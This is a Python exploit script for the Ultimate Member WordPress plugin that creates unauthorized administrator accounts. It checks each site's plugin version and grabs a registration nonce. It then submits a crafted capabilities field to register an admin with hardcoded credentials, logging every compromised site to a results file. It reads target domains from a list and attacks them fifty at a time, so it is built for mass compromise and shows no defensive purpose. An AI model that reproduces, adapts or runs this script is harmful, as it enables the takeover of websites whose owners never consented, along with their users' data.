import re
import sys
import urllib3
import requests
import argparse
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

username = "Webmaster1337"
password = "#Webmaster1337#"
email = "xecvcmrmezh@spacehotline.com"


def check_version(target):
    print(Style.RESET_ALL + "Site version:", end=' ')
    try:
        r = requests.get(f"{target}/wp-content/plugins/ultimate-member/readme.txt", verify=False)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]
    except:
        print(Fore.RED + f'error...')
        return

    if int(version.replace('.', '')) < 267:
        print(Fore.GREEN + f'{version} - vulnerable!')
    else:
        print(Fore.RED + f'{version} - not vulnerable!')


def add_admin(target, form_id):
    headers = {
        'User-Agent': 'Secragon Offensive Agent'
    }

    print(Style.RESET_ALL + "Getting nonce:", end=' ')

    s = requests.Session()
    try:
        r = s.get(f'{target}/index.php/register/', headers=headers, verify=False)
        nonce = re.search(r"name=\"_wpnonce\" value=\"(.{10})\"", r.text).groups()[0]
        print(Fore.GREEN + f"{nonce}")
    except:
        print(Fore.RED + f'error...')
        return

    data = {
        f'user_login-{form_id}': username,
        f'user_email-{form_id}': email,
        f'user_password-{form_id}': password,
        f'confirm_user_password-{form_id}': password,
        f'first_name-{form_id}': 'Exploit',
        f'last_name-{form_id}': 'bySecragon',
        'form_id': form_id,
        'um_request': '',
        '_wpnonce': nonce,
        'wp_cÃ pabilities[administrator]': 1
    }

    print(Style.RESET_ALL + "Adding a new admin:", end=' ')

    try:
        r = s.post(f'{target}/index.php/register/', data=data, headers=headers, verify=False)
        if r.history and r.history[0].status_code == 302:
            print(Fore.GREEN + f'done')
            # Simpan hasil ke dalam file results.txt
            with open('results.txt', 'a') as file:
                file.write(f"Site: {target}\n")
                file.write(f"Username: {username}\n")
                file.write(f"Password: {password}\n")
                file.write("-" * 40 + "\n")
        else:
            print(Fore.RED + f'error...')
    except:
        print(Fore.RED + f'error...')


def process_domain(domain):
    domain = domain.strip()
    print()
    print(Fore.BLUE + f"\t\t --- Ultimate Member exploit ---")
    print("\t\t   (unauthorized admin access)")
    print(Fore.RED + "\t\t\t\t\tby gbrsh@secragon")
    print(Style.RESET_ALL)
    print(f"Target: {domain}")
    print("-" * 40)
    check_version(domain)
    add_admin(domain, 6)


def process_domains(file_path):
    with open(file_path, 'r') as file:
        domains = file.readlines()

    # Use ThreadPoolExecutor with max_workers set to 50
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(process_domain, domains)


if __name__ == '__main__':
    print()


    parser = argparse.ArgumentParser()
    parser.add_argument('file', help='Path to the file containing the list of domains')

    if len(sys.argv) == 1:
        parser.print_help()
        print()
        sys.exit()

    args = parser.parse_args()
    process_domains(args.file)
